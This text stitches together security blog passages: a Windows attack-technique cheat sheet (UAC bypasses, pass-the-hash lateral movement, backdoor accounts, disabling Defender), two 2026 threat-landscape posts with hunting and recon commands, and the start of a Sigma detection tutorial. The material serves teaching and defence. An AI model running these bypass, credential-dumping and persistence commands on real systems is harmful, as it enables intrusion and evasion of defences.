reg query hklm\software\microsoft\windows\currentversion\policies\system /v enablelua

# ── fodhelper uac bypass ─────────────────────────────────────────────────────
# fodhelper.exe auto-elevates and reads shell\open\command from hkcu (user-writable)
new-item "hkcu:\software\classes\ms-settings\shell\open\command" -force
new-itemproperty "hkcu:\software\classes\ms-settings\shell\open\command" `
    -name delegateexecute -value "" -force
set-itemproperty "hkcu:\software\classes\ms-settings\shell\open\command" `
    -name "(default)" -value "c:\temp\payload.exe" -force
start-process "c:\windows\system32\fodhelper.exe"
# clean up
remove-item "hkcu:\software\classes\ms-settings\" -recurse -force

# ── eventvwr uac bypass ──────────────────────────────────────────────────────
new-item "hkcu:\software\classes\mscfile\shell\open\command" -force
set-itemproperty "hkcu:\software\classes\mscfile\shell\open\command" `
    -name "(default)" -value "c:\temp\payload.exe" -force
start-process "c:\windows\system32\eventvwr.exe"

# ── uacme / automated bypass tools ──────────────────────────────────────────
.\uacme\akagi64.exe 23 c:\temp\payload.exe   # method 23 = fodhelper

# ── check uac bypass mitigations ─────────────────────────────────────────────
# enablevirtualization = 1 means registry/file virtualisation is active
reg query hklm\software\microsoft\windows\currentversion\policies\system /v enablevirtualization lateral movement once you have credentials or a session on one machine, lateral movement is how you reach other targets in the network. # ── crackmapexec (cme) — swiss army knife for ad ────────────────────────────
# password spray across a subnet
crackmapexec smb 10.10.10.0/24 -u alice -p 'password1!'

# pass-the-hash
crackmapexec smb 10.10.10.5 -u administrator -h aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# execute command
crackmapexec smb 10.10.10.5 -u alice -p 'password1!' -x "whoami"
crackmapexec winrm 10.10.10.5 -u alice -p 'password1!' -x "whoami"

# dump sam
crackmapexec smb 10.10.10.5 -u administrator -p 'password1!' --sam

# ── impacket suite ───────────────────────────────────────────────────────────
# psexec-style (interactive system shell)
impacket-psexec administrator:password1!@10.10.10.5
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.5

# wmi exec
impacket-wmiexec administrator:password1!@10.10.10.5 "whoami"

# smbexec (noisier, different artefacts)
impacket-smbexec administrator:password1!@10.10.10.5

# ── evil-winrm ───────────────────────────────────────────────────────────────
evil-winrm -i 10.10.10.5 -u alice -p 'password1!'
evil-winrm -i 10.10.10.5 -u alice -h 31d6cfe0d16ae931b73c59d7e0c089c0

# ── rdp ──────────────────────────────────────────────────────────────────────
xfreerdp /u:alice /p:'password1!' /v:10.10.10.5
xfreerdp /u:alice /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /v:10.10.10.5  # pth rdp

# enable rdp (if you have admin)
reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
netsh advfirewall firewall add rule name="rdp" protocol=tcp dir=in localport=3389 action=allow

# ── winrm from powershell ────────────────────────────────────────────────────
$cred = get-credential
enter-pssession -computername 10.10.10.5 -credential $cred
invoke-command -computername 10.10.10.5 -credential $cred -scriptblock { whoami; hostname } persistence mechanisms persistence ensures access survives reboots, logoffs, and credential changes. # ── create persistence ───────────────────────────────────────────────────────
# registry run key
set-itemproperty "hkcu:\software\microsoft\windows\currentversion\run" `
    -name "windowsupdate" -value "c:\temp\payload.exe"

# startup folder (no admin needed for current user)
copy-item c:\temp\payload.exe `
    "$env:appdata\microsoft\windows\start menu\programs\startup\update.exe"

# new local admin account (if you have privs)
net user backdoor p@ssw0rd! /add
net localgroup administrators backdoor /add
net user backdoor /active:yes

# wmi event subscription (stealthy, survives reboots)
$filter = ([wmiclass]"\\\\localhost\\root\\subscription:__eventfilter").createinstance()
$filter.name = "windowsupdate"
$filter.querylanguage = "wql"
$filter.query = "select * from __instancemodificationevent within 60 where targetinstance isa 'win32_perfrawdata_perfos_system'"
$filter.put()

# ── hunt for persistence ─────────────────────────────────────────────────────
# autoruns (sysinternals) — the gold standard
autorunsc.exe -a * -user * -c -h -vt | export-csv autoruns.csv

# manual checks
reg query "hkcu\software\microsoft\windows\currentversion\run"
reg query "hklm\software\microsoft\windows\currentversion\run"
reg query "hklm\software\microsoft\windows\currentversion\runonce"

get-scheduledtask | where state -ne disabled | select taskname, taskpath

get-ciminstance win32_service | where startmode -eq 'auto' | 
    select name, pathname, startname

get-childitem "$env:appdata\microsoft\windows\start menu\programs\startup"
get-childitem "c:\programdata\microsoft\windows\start menu\programs\startup"

# wmi subscriptions
get-wmiobject -namespace root\subscription -class __eventfilter
get-wmiobject -namespace root\subscription -class __eventconsumer
get-wmiobject -namespace root\subscription -class __filtertoconsumerbinding sysinternals & defender tools the **sysinternals suite** (now microsoft) provides tools that go far beyond what's built into windows. essential for both attackers and defenders. **windows defender / microsoft defender for endpoint (mde)**
- built-in av + edr on modern windows
- **amsi** (antimalware scan interface) — hooks into powershell, jscript, vbscript to scan content at runtime
- **controlled folder access** — blocks ransomware by preventing writes to protected folders
- **attack surface reduction (asr) rules** — block specific behaviours (office macros calling cmd, psexec, credential dumping) # check defender status
get-mpcomputerstatus
get-mpcomputerstatus | select amrunningmode, realtimeprotectionenabled, 
    antivirussignaturelastupdated, amproductversion

# defender exclusions (may reveal unmonitored paths)
get-mppreference | select exclusionpath, exclusionprocess, exclusionextension

# disable defender (requires admin, and tamper protection must be off)
set-mppreference -disablerealtimemonitoring $true

# add exclusion (common attacker move after getting admin)
add-mppreference -exclusionpath "c:\temp"
add-mppreference -exclusionextension ".exe"

# check asr rules
get-mppreference | select attacksurfacereductionrules_ids, attacksurfacereductionrules_actions

# amsi bypass awareness — what defenders look for:
# amsiinitfailed patching, memory patching amsi.dll, reflection to set amsicontext
# modern defenders alert on script blocks containing amsi bypass patterns

# sysmon — check if installed
get-service sysmon -erroraction silentlycontinue
get-process sysmon -erroraction silentlycontinue

# sysmon config
sysmon -c           # print current config

# check logging policy
auditpol /get /category:*
# specifically:
auditpol /get /subcategory:"process creation"    # should be success,failure
auditpol /get /subcategory:"logon" key takeaways **concepts to have cold:**

- `lsass.exe` is the credential goldmine — it holds hashes and tickets for every logged-in user. getting system and dumping lsass is the backbone of windows credential theft.
- the sam database stores local hashes; ntds.dit stores all domain hashes. both are locked at runtime — you need vss, reg save, or dcsync.
- ntlm hashes are pass-the-hash-able. you don't need to crack them to use them.
- `seimpersonateprivilege` on a service account → potato attack → system. this is reliably true on unpatched or default configs.
- registry run keys, scheduled tasks, and services are the three main persistence locations. check all three when hunting implants.
- kerberoasting: any domain user can request a service ticket for any spn. hash goes offline for cracking. no logs until cracking succeeds.
- always run `whoami /all` on every new windows shell — privileges and groups tell you the entire escalation story at a glance.
- uac is not a security boundary. it's a speedbump against accidental elevation. medium-integrity admin account + known bypass = high integrity in seconds.
- powershell script block logging (event 4104) records everything. assume your commands are being logged. understand what defenders see.
- bloodhound maps the entire ad graph visually — run sharphound, import, and follow the attack paths. it finds privilege escalation routes through acl chains that no manual enumeration would find.

**tools to know:**
`nmap`, `crackmapexec`, `impacket`, `evil-winrm`, `mimikatz`, `rubeus`, `bloodhound/sharphound`, `powerup`, `winpeas`, `sysmon`, `autoruns`, `procmon`

windows enterprise environments are complex by design — that complexity creates attack surface. every feature (delegation, wmi, com, dfs, rpc) is also a potential vector. the deeper your understanding of how windows actually works, the faster you move on every engagement.

title: Q2 2026 Threat Landscape – Attackers Target Trust Infrastructure
summary: Attackers in Q2 2026 are bypassing endpoints entirely and going straight for identity systems, VPNs, device managers, and security tools. A breakdown of activel
body:
q2 2026 threat landscape – attackers target trust infrastructure attackers in q2 2026 are bypassing endpoints entirely and going straight for identity systems, vpns, device managers, and security tools. a breakdown of actively exploited cves, macro trends, and what defenders should prioritise now. news cve zero-day active-exploitation the theme: hit the trust layer, not the endpoint the defining pattern of q2 2026 is not novel malware or exotic techniques — it is **target selection**. threat actors are consistently choosing systems that other systems inherently trust: vpn gateways, identity providers, mdm platforms, collaboration hubs, and the security products meant to detect them.

compromise one of these and you do not need a foothold on every workstation. you have the keys to the domain. actively exploited cves the following vulnerabilities have confirmed in-the-wild exploitation as of q2 2026. severity scores are listed but should not be the primary driver for prioritisation — **attack chain placement and blast radius matter more**. cve-2026-0257 — palo alto globalprotect (critical) **type:** authentication bypass in the globalprotect ssl-vpn portal
**exploitation:** confirmed — weaponised within days of disclosure
**attack chain role:** initial access → direct network entry

an unauthenticated attacker can bypass the vpn authentication layer entirely, gaining access to the internal network without credentials. because globalprotect is an internet-facing trust boundary, successful exploitation grants the same network position as a legitimate remote employee — before a single endpoint is touched.

**why it matters:** vpns sit at the outer trust perimeter. credential-based controls downstream assume the perimeter held. once bypassed, siem alerts based on "unusual login location" are silent. # check exposure -- identify globalprotect portals in your asset inventory
nmap -p 443 --script ssl-cert,http-title <target-range> | grep -i 'globalprotect\|palo alto'

# shodan query for exposed instances (for authorised asset discovery)
# shodan search 'http.title:"globalprotect" http.component:"palo alto"'

# check installed pan-os version via api (with credentials)
curl -k 'https://<firewall>/api/?type=version'

# cisa kev check -- pull current known exploited vulnerabilities catalogue
curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json \
  | python3 -c "import json,sys; [print(e['cveid'],e['vendorproject']) for e in json.load(sys.stdin)['vulnerabilities'] if 'palo' in e.get('vendorproject','')]" cve-2026-32201 — microsoft sharepoint (high) **type:** remote code execution via malicious page/web part deserialization
**exploitation:** confirmed — observed in targeted intrusions against enterprise environments
**attack chain role:** initial access → internal reconnaissance → lateral movement

sharepoint is not just a file server — it is the organisational memory of most enterprises: org charts, project documents, finance workflows, hr records, it run-books. exploitation grants an attacker authenticated read/write access to this intelligence before any edr on a workstation fires.

**why it matters:** post-exploitation data harvesting from sharepoint is virtually indistinguishable from legitimate user activity at the network level. exfiltration blends into normal sharepoint traffic. # identify exposed sharepoint instances
nmap -p 443 --script http-title,http-headers <target> | grep -i sharepoint

# check sharepoint version (on-prem, authenticated)
curl -s -k 'https://<sharepoint>/_vti_pvt/service.cnf' | grep vti_extenderversion

# hunt for evidence of exploitation in sharepoint uls logs
# on sharepoint server:
get-splogevent -starttime (get-date).adddays(-7) | where-object {$_.message -match 'deserialization|exception|error'}

# check for suspicious web parts added recently
get-spweb -limit all | get-spwebpart | where-object {$_.created -gt (get-date).adddays(-14)} cve-2026-33825 & cve-2026-45498 — microsoft defender (high) **type:** two separate vulnerabilities — privilege escalation (33825) and security disruption / tamper protection bypass (45498)
**exploitation:** both confirmed in-the-wild
**attack chain role:** privilege escalation, defense evasion, visibility reduction

these are chained in observed intrusions: 33825 escalates a low-privilege process to system, then 45498 disables defender's tamper protection and real-time monitoring without triggering standard alerts. the result is a machine that appears protected but is not.

**this is a two-stage blind:** the attacker first gains elevation, then silences the only tool monitoring the escalation. # check if defender tamper protection is still enabled
get-mpcomputerstatus | select-object -property istamperprotected, realtimeprotectionenabled, amserviceenabled

# check defender service state and last update
get-service -name windefend | select-object status, starttype
get-mpcomputerstatus | select-object antivirussignaturelastupdated

# hunt for tamper protection changes in windows event log
get-winevent -logname 'microsoft-windows-windows defender/operational' |
  where-object {$_.id -in @(5001,5007,5010,5012)} |
  select-object timecreated, id, message

# event ids of interest:
# 5001 - real-time protection disabled
# 5007 - configuration changed
# 5010 - antimalware disabled
# 5012 - on-access scanning disabled cve-2026-6973 — ivanti epmm (critical) **type:** unauthenticated remote code execution in ivanti endpoint manager mobile (formerly mobileiron)
**exploitation:** confirmed — nation-state and ransomware actors both observed
**attack chain role:** enterprise access → device control → policy manipulation

epmm manages every enrolled mobile device in an organisation: push configurations, enforce policies, wipe devices, deploy apps, and access corporate email. exploitation gives an attacker the ability to push malicious configuration profiles to thousands of managed devices silently.

**why it matters:** a compromised mdm is a force-multiplier. it turns one server breach into fleet-wide compromise of every enrolled phone, tablet, and laptop. # identify exposed ivanti epmm / mobileiron instances
curl -sk https://<target>/mifs/user/login.jsp -i | grep -i 'server\|x-powered-by\|mobileiron'

# check version from api endpoint (no auth required on unpatched)
curl -sk 'https://<target>/api/v1/metadata/version'

# shodan dork (authorised recon)
# shodan search 'http.favicon.hash:<ivanti_hash> country:us'

# check epmm access logs for exploitation indicators
# look for unauthenticated api calls to sensitive endpoints:
grep -e 'post.*/api/v1/(user|device|config).*401|403' /var/log/mi*.log | tail -50 macro trends **1. patch-to-exploit compression**
the window between public cve disclosure and mass exploitation is shrinking measurably. several q2 2026 cves saw weaponised pocs within 48–72 hours of nvd publication. patch slas of 30 days are no longer adequate for critical internet-facing systems — target 24–48 hours for cvss ≥9 on perimeter assets.

**2. security tools as attack surface**
defender (twice), crowdstrike, sentinelone, and tenable products all had cves with confirmed exploitation in the past 12 months. the implicit assumption that security products are hardened and trusted deserves re-examination. apply vendor patches for security software *first*, not last.

**3. identity-first intrusions**
malware deployment is frequently the *last* step, not the first. observed kill-chains increasingly show: vpn bypass → credential harvest → lateral movement via legitimate auth → data exfil → ransomware only if prior objectives failed. standard av/edr detects none of the first four phases.

**4. ai-assisted weaponisation**
poc-to-production exploit timelines are compressing in part because llms lower the barrier to patch diffing and variant generation. expect this trend to accelerate. mitre att&ck mapping – q2 2026 activity observed techniques mapped to att&ck for the cves above: # query att&ck stix data for a technique (requires mitreattack-python)
pip3 install mitreattack-python -q
python3 - <<'eof'
from mitreattack.stix20 import mitreattackdata
ma = mitreattackdata("enterprise-attack.json")  # download from github.com/mitre/cti
techs = ma.get_techniques_used_by_group_with_id("g0096")  # apt41 as example
for t in techs[:5]:
    print(t['technique'].name, t['technique'].external_id)
eof

# alternatively: use the att&ck navigator json layers for visualisation
# https://mitre-attack.github.io/attack-navigator/ defender priorities based on q2 2026 exploitation patterns, the highest-impact defensive actions in order:

1. **patch internet-facing auth/vpn first** — globalprotect, pulse, fortinet, cisco anyconnect. these are where intrusions start. 24-hour patch sla.
2. **audit mdm platform access** — who can call the ivanti/jamf/intune api? enable mfa on admin consoles. log all device config push events.
3. **monitor security tool health** — alert on defender tamper protection changes. verify edr agent status from the management console, not from the endpoint itself.
4. **sharepoint anomaly detection** — baseline normal access patterns; alert on bulk document downloads, off-hours access, and new web part deployments.
5. **credential hygiene** — identity-first intrusions succeed because credentials are reused or weakly protected. enforce phishing-resistant mfa (fido2/passkeys) on all admin accounts.
6. **threat hunt retroactively** — search logs for known c2 ips/domains from the past 90 days. attackers may have been present long before detection. red team / research perspective # check your own perimeter exposure (authorised recon)
# find internet-facing vpn/auth portals in your ip space
nmap -p 443,4443,8443,10443 --open --script http-title <your-ranges> \
  | grep -ie 'vpn|globalprotect|pulse|fortinet|anyconnect|ivanti|mobileiron'

# enumerate sharepoint version on an authorised target
curl -sk 'https://<sharepoint>/_layouts/15/start.aspx' -i
curl -sk 'https://<sharepoint>/_vti_bin/shtml.exe/test.htm' | grep 'vti'

# check if a cve-2026-0257 patch was applied (example version check)
curl -sk 'https://<gp-portal>/global-protect/login.esp' \
  | grep -i 'version\|pan-os'

# validate mdm exposure
curl -sk 'https://<epmm>/api/v1/metadata' | python3 -m json.tool

# cve poc search (for research/lab environments only)
searchsploit 'sharepoint 2026'
searchsploit 'palo alto globalprotect'
git clone https://github.com/trickest/cve 2>/dev/null; grep -r 'cve-2026' cve/ 2>/dev/null | head - the biggest q2 2026 risk is not malware — it is attackers moving through your network using **legitimate trust mechanisms** after bypassing the perimeter
- cvss scores alone do not reflect operational risk; **attack chain placement** (initial access vs. post-exploitation) changes everything
- if you can only do one thing: **pull the cisa kev feed weekly** and treat every entry as actively exploited against something you own

**vendor advisories:**
- palo alto psirt: `security.paloaltonetworks.com`
- microsoft msrc: `msrc.microsoft.com`
- ivanti security: `forums.ivanti.com/s/topic/0to4400000009ctgay`
- nvd: `nvd.nist.gov`

title: Q1 2026 Threat Landscape – Zero-Days, MDM Campaigns & AD Privilege Paths
summary: Q1 2026 brought a wave of pre-authentication zero-days exploited before public disclosure, paired MDM campaigns against Ivanti EPMM, a critical Citrix NetScaler
body:
q1 2026 threat landscape – zero-days, mdm campaigns & ad privilege paths q1 2026 brought a wave of pre-authentication zero-days exploited before public disclosure, paired mdm campaigns against ivanti epmm, a critical citrix netscaler auth bypass, a netlogon privilege path to domain control, and a public linux kernel lpe. none of these overlap with the q2 post. news cve zero-day active-exploitation ivanti active-directory linux what set q1 apart q1 2026 introduced a pattern that would define the rest of the year: **vulnerabilities exploited before anyone outside the vendor knew they existed**. several cves entered the cisa kev catalogue within days of first public disclosure — meaning defenders had effectively zero reaction time.

the dominant campaigns were not opportunistic. threat actors ran coordinated, multi-cve operations against the same platform (ivanti epmm) using two separate zero-days in tandem, deploying web shells and backdoors before patches were available. cve-2026-1281 — ivanti epmm pre-auth rce (critical, zero-day) **type:** unauthenticated remote code execution — code injection
**cvss:** 9.8 | **exploitation:** confirmed active, in kev, exploited before disclosure
**attack chain role:** initial access → system compromise → persistence

this is the first of two paired zero-days hitting ivanti endpoint manager mobile in q1. the root cause is a code injection flaw in the in-house application distribution and android file transfer configuration features — both reachable without any credentials from the internet.

what makes this particularly severe is the **pre-disclosure exploitation window**: threat actors had a working exploit before the vendor had issued any advisory, before any patch existed, and before any defender had reason to check. mass internet scanning for exposed epmm instances was observed within the same campaign window.

**why it matters:** epmm is the administrative control plane for every enrolled mobile device — phones, tablets, laptops. pre-auth rce on this platform is equivalent to handing an attacker an enterprise-wide device management console on day zero. # identify exposed ivanti epmm instances (check your own assets)
nmap -p 443,8443 --script http-title,ssl-cert <target-range> \
  | grep -ie 'mobileiron|ivanti|mifs'

# version fingerprint (unauthenticated endpoint on unpatched builds)
curl -sk 'https://<target>/mifs/aad/rp/content/images/devices.json' -i
curl -sk 'https://<target>/api/v1/metadata/version' | python3 -m json.tool

# detection: hunt for unexpected processes spawned by epmm service
# on the server -- look for shells launched by the java process
ps auxf | grep -a5 'java.*epmm\|java.*mifs'

# hunt web shells dropped post-exploitation
find /opt/mobileiron /opt/mifs /usr/local/mobilemanager \
  -name '*.jsp' -newer /etc/passwd -ls 2>/dev/null

# check outbound connections from epmm host (c2 indicator)
ss -tnp | grep -v '127.0.0.1'
netstat -anp | grep established | grep java cve-2026-1340 — ivanti epmm pre-auth rce (critical, zero-day) **type:** unauthenticated remote code execution — code injection
**cvss:** 9.8 | **exploitation:** confirmed active, in kev, public poc available
**attack chain role:** initial access (operationally paired with cve-2026-1281)

this cve was observed **within the same exploitation campaigns** as cve-2026-1281 — not as an alternative but as a complement. attackers used both vulnerabilities against the same targets in the same intrusion windows, likely as reliability redundancy: if one payload path failed, the other succeeded.

the pairing matters for detection: blocking one cve's specific request pattern is not sufficient. defenders who patched one but not both remained exposed. # both cves share the same detection surface -- check epmm api access logs
# look for unauthenticated requests to sensitive api paths:
grep -e '(post|get).*/mifs/aad|/api/v1/(apps|devices|users|config)' \
  /var/log/nginx/access.log 2>/dev/null \
  | grep -v '200\|302' | tail -50

# check for newly created admin accounts (post-exploitation persistence)
curl -sk 'https://localhost/api/v2/administrators' \
  -h 'authorization: bearer <admin-token>' | python3 -m json.tool \
  | grep -e 'created_at|username|role'

# hunt for backdoor installations -- unusual binaries in epmm dirs
find /opt /usr/local -newer /etc/passwd -type f -executable \
  ! -path '*/proc/*' 2>/dev/null | grep -ve '\.(jar|class|war)$'

# verify patch level against vendor advisory
# patched versions: epmm >= 11.12.0.4 / 11.11.0.6 / 11.10.0.6
curl -sk 'https://<target>/api/v1/metadata/version' \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print('version:', d.get('productversion','unknown'))" q1 2026 established a sustained campaign against ivanti epmm using cve-2026-1281 and cve-2026-1340 in tandem for initial access, followed later in q2 by cve-2026-6973 (authenticated rce) to deepen access after credentials were stolen.

this is a full attack chain built around one product: get in pre-auth → steal admin creds → exploit authenticated path for persistence and deeper control. if your organisation runs any version of ivanti epmm / mobileiron, treat all three cves as a coordinated campaign, not isolated bugs. cve-2026-3055 — citrix netscaler adc / gateway (critical) **type:** authentication bypass / session abuse on the netscaler management and vpn interface
**cvss:** 9.3 | **exploitation:** confirmed active, in kev
**attack chain role:** initial access → authentication abuse → network entry

netscaler adc and gateway are the perimeter devices organisations trust for vpn access, sso, and saml-based authentication for remote workforces. this vulnerability allows an attacker to abuse the authentication flow — bypassing it or hijacking sessions — without needing valid credentials.

**why it matters:** a netscaler compromise happens *before* any internal control fires. downstream siem rules that alert on "suspicious internal login" assume the perimeter authenticated the user correctly. when the perimeter itself is the vulnerability, that assumption breaks.

observed activity included internet-wide scanning specifically targeting unpatched netscaler appliances, followed by perimeter reconnaissance and authentication targeting — consistent with nation-state and ransomware precursor activity. # fingerprint exposed netscaler instances
curl -sk 'https://<target>/vpn/index.html' | grep -ie 'citrix|netscaler|ns_build'
curl -sk 'https://<target>/nitro/v1/config/nsversion' \
  -h 'x-nitro-user: nsroot' -h 'x-nitro-pass: nsroot' 2>/dev/null

# shodan query (authorised asset discovery)
# shodan search 'http.title:"citrix gateway" ssl.cert.issuer.cn:citrix'

# check ns build version (via management interface, authenticated)
ssh nsroot@<netscaler> 'show version' 2>/dev/null | grep 'netscaler'

# detection: look for abnormal session patterns in ns.log
# typically at /var/log/ns.log or /var/nslog/
grep -ie '(sslvpn|aaa|saml).*(error|fail|bypass|invalid)' /var/log/ns.log | tail -30

# hunt for unexpected admin sessions from unusual ips
grep 'login succeeded' /var/log/ns.log \
  | awk '{print $nf}' | sort | uniq -c | sort -rn | head -20

# check if saml metadata has been tampered with
curl -sk 'https://<target>/saml/login' -i | grep -i 'saml\|idp\|sp' cve-2026-41089 — windows server netlogon privilege escalation (critical) **type:** privilege escalation in the windows netlogon remote protocol
**cvss:** 9.8 | **exploitation:** observed in the wild
**attack chain role:** privilege escalation → system access → domain control → kerberos abuse

netlogon is the windows protocol domain-joined machines use to authenticate against domain controllers. a flaw here means an attacker with any foothold inside the network — even a low-privilege user account — can escalate toward system on a domain controller.

from system on a dc, the game is over: the attacker can dump the ntds.dit (all domain password hashes), forge kerberos tickets (golden ticket), create persistent backdoor domain admin accounts, and own every domain-joined machine.

**attack path in observed intrusions:**
`low-priv domain user → cve-2026-41089 → system on dc → dcsync → full domain compromise` # --- detection on domain controllers ---

# check netlogon service status and version
get-service -name netlogon | select-object status, starttype
(get-item 'c:\windows\system32\netlogon.dll').versioninfo.fileversion

# hunt for exploitation artefacts: unexpected system-level processes
get-process | where-object {$_.si -eq 0} | select-object name, id, path

# check for new privileged accounts created recently (post-exploit persistence)
get-aduser -filter * -properties whencreated, memberof |
  where-object {$_.whencreated -gt (get-date).adddays(-14)} |
  select-object samaccountname, whencreated, enabled

# check domain admins group for unexpected members
get-adgroupmember -identity 'domain admins' |
  select-object samaccountname, distinguishedname

# hunt for dcsync activity in security event log
# event 4662: operation performed on an object (look for replication rights)
get-winevent -filterhashtable @{logname='security'; id=4662} |
  where-object {$_.message -match '1131f968|1131f6ad|89e95b76'} |
  select-object timecreated, message | select-object -first 10

# check netlogon log for anomalous entries
get-content 'c:\windows\debug\netlogon.log' | select-object -last 100 |
  where-object {$_ -match 'error\|failed\|denied'} # --- red team / lab perspective (authorised ad testing) ---

# check if dc is vulnerable via version (requires domain access)
crackmapexec smb <dc-ip> -u user -p pass --gen-relay-list /tmp/relay.txt

# enumerate dc via netlogon (requires domain creds)
python3 -c "
from impacket.dcerpc.v5 import nrpc, transport
# connect to netlogon on dc
"

# post-compromise: verify domain admin access achieved
crackmapexec smb <dc-ip> -u administrator -h <ntlm-hash> --shares
secretsdump.py -just-dc domain/administrator@<dc-ip> -hashes :<ntlm-hash>

# dcsync to dump all hashes (confirms domain compromise)
secretsdump.py -just-dc-ntlm domain/administrator@<dc-ip> 2>/dev/null | head -20 cve-2026-31431 — linux kernel "copy fail" local privilege escalation **type:** local privilege escalation in the linux kernel
**exploitation:** public exploit available
**attack chain role:** post-exploitation — converts limited user access to root
**alias:** "copy fail"

this kernel vulnerability allows a local user (including a container user with certain capabilities, or a process with limited shell access) to escalate to root. it does not provide initial access on its own — but paired with any low-privilege foothold (ssh with a weak credential, a web shell running as `www-data`, a misconfigured sudo entry), it becomes a clean root escalation.

affected distributions include ubuntu, rhel, suse, and amazon linux — meaning this affects both on-premise linux servers and cloud workloads.

**why it matters to attackers:** web shells and initial access often land in unprivileged contexts. "copy fail" turns that limited foothold into full root without any network movement or credential theft. # check kernel version (vulnerability window varies by distro/patch)
uname -r
cat /etc/os-release

# ubuntu patched kernel versions (example)
# ubuntu 22.04: 5.15.0-105+
# ubuntu 20.04: 5.4.0-182+
# rhel 9: kernel-5.14.0-427+

# check if running a vulnerable kernel (generic version check)
kernelver=$(uname -r)
echo "running kernel: $kernelver"
# compare against vendor advisory for your distro

# check if public poc applies (test in lab only)
# poc typically exploits copy_file_range() syscall mishandling
# indicator: any setuid binary writable or exploitable via the copy path
find / -perm -4000 -type f 2>/dev/null | head -20

# detection: kernel audit log for unusual privilege escalation
ausearch -m avc,user_avc -ts recent 2>/dev/null | grep -i 'execve\|capability'

# check for exploitation artefacts: new suid binaries
# baseline: run this before and after any incident
find / -perm -4000 -type f 2>/dev/null | sort > /tmp/suid_now.txt
diff /tmp/suid_baseline.txt /tmp/suid_now.txt

# monitor for unexpected root processes from web service users
auditctl -a always,exit -f arch=b64 -s execve -f uid=33 -k www-exec  # uid 33 = www-data
audit2allow -la | grep www-exec campaign patterns across q1 three distinct campaign patterns emerged from q1 activity:

**pattern 1: mdm platform targeting**
cve-2026-1281 and cve-2026-1340 were not independent incidents — they were used together in the same operations. attackers who compromised epmm via cve-2026-1281 often had cve-2026-1340 payloads staged as a fallback. the goal was reliable initial access to mobile management infrastructure, followed by web shell persistence and credential harvesting for lateral movement.

**pattern 2: identity & access infrastructure**
cve-2026-3055 (citrix netscaler) and cve-2026-0257 (palo alto globalprotect, q2) both target the same strategic layer — the network perimeter where authentication decisions are made. compromising this layer means attackers arrive in the internal network *already authenticated*, making subsequent activity invisible to tools that trust perimeter decisions.

**pattern 3: post-compromise privilege escalation**
cve-2026-41089 (netlogon) and cve-2026-31431 (linux kernel) serve a different role — they are not entry points but **multipliers**. once any low-privilege foothold exists, these convert it to domain admin or root. their presence in active campaigns signals that attackers had already achieved initial access and were escalating. mitre att&ck mapping – q1 2026 red team / research perspective # scan for exposed mdm and citrix surfaces (authorised recon)
nmap -p 443,8443,4443 --open --script http-title,http-headers <ranges> \
  | grep -ie 'mobileiron|ivanti|mifs|netscaler|citrix|gateway'

# check citrix netscaler version remotely
curl -sk 'https://<target>/citrix/xenapp/auth/login.aspx' \
  | grep -i 'version\|build\|release'

# enumerate domain netlogon rpc endpoint
nmap -p 135,445 --script msrpc-enum <dc-target>
impacket-rpcdump @<dc-ip> | grep -i 'netlogon\|ntds'

# check if domain controller has been patched
crackmapexec smb <dc-ip> --gen-relay-list /dev/null 2>&1 | grep -i 'windows\|build'

# linux kernel exploit check in a lab vm
# check if copy_file_range syscall behaves unexpectedly
python3 -c "import ctypes; libc=ctypes.cdll('libc.so.6'); print(libc.syscall(326))"
# 326 = copy_file_range syscall number on x86_64

# poc search (research / lab only)
searchsploit 'netlogon 2026'
searchsploit 'linux kernel copy_file_range'
exploit-db -s 'cve-2026-31431' - **pre-disclosure zero-days are not rare anymore** — cve-2026-1281 was being exploited while the vendor was still unaware. patch slas measured in days, not weeks.
- **paired cves mean patching one is not enough** — cve-2026-1281 and cve-2026-1340 were designed to be used together. always check for sibling cves on the same product.
- **web shell + backdoor = the attacker is staying** — observed post-exploitation on epmm was persistence-first, not data-first. assume dwell time; hunt retroactively.
- **cve-2026-31431 needs no network access** — any web shell, any low-priv ssh session, any misconfigured suid can trigger it. patch linux kernels across all workloads including cloud.

**see also:** the [q2 2026 post](/post/threat-landscape-q2-2026) covers cve-2026-0257 (globalprotect), cve-2026-32201 (sharepoint), and the microsoft defender chain.

title: Threat Hunting with Sigma Rules — Writing Detections That Actually Work
summary: Sigma is the vendor-neutral standard for writing detection rules that compile to any SIEM. Covers the Sigma format in depth, writing rules for real ATT&CK techn
body:
threat hunting with sigma rules — writing detections that actually work sigma is the vendor-neutral standard for writing detection rules that compile to any siem. covers the sigma format in depth, writing rules for real att&ck techniques, converting to splunk/elastic/qradar queries, hunting methodologies, and building a detection pipeline that keeps pace with evolving adversaries. security threat-hunting sigma detection siem blue-team edr soc mitre-attack threat hunting is not waiting for an alert. it is the proactive search for adversary activity that your current detections have missed — the assumption that a breach has occurred or is occurring, and a structured effort to find it.

sigma is the language that makes detections portable. write a rule once, compile it to splunk, elastic, azure sentinel, qradar, or wazuh. the sigma community maintains a library of thousands of rules mapped to mitre att&ck — the best starting point for any detection programme. this post covers the format, the methodology, and the craft of writing rules that catch real adversary behaviour without flooding analysts with noise. reactive monitoring vs proactive hunting the output of a threat hunt is either **confirmation that a technique is absent** (and therefore implicitly covered) or **a new detection rule** for the thing you found. every hunt should produce a sigma rule, even if the hunt found nothing — you have now validated that the absence of that artefact means the technique was not used. the sigma format a sigma rule is a yaml document describing a detection. it is structured into a header (metadata), a detection section (the logic), and conditions (how to combine the logic). # sigma rule skeleton — every rule follows this structure
title: descriptive name of what this detects        # required
id: 8b6b0def-1234-5678-9abc-def012345678            # uuid, required, generate with uuidgen
status: experimental                                 # stable | test | experimental | deprecated
description: |                                       # required
    one paragraph explaining what behaviour this detects,
    why it matters, and what adversary technique it covers.
references:                                          # optional but important
    - https://attack.mitre.org/techniques/t1059/001/
    - https://example.com/blog/technique-analysis
author: your name                                    # optional
date: 2026-06-16                                    # optional
tags:                                               # mitre att&ck mapping
    - attack.execution
    - attack.t1059.001
logsource:                                          # what log source
    category: process_creation                      # sigma category (maps to eventid etc.)
    product: windows                                # product filter
detection:                                          # the logic lives here
    selection_main:                                 # named selection block
        image|endswith: '\powershell.exe'
        commandline|contains|all:                   # all of these must match
            - '-enc'
            - '-noni'
    selection_alt:
        image|endswith: '\pwsh.exe'
        commandline|contains: '-enc'
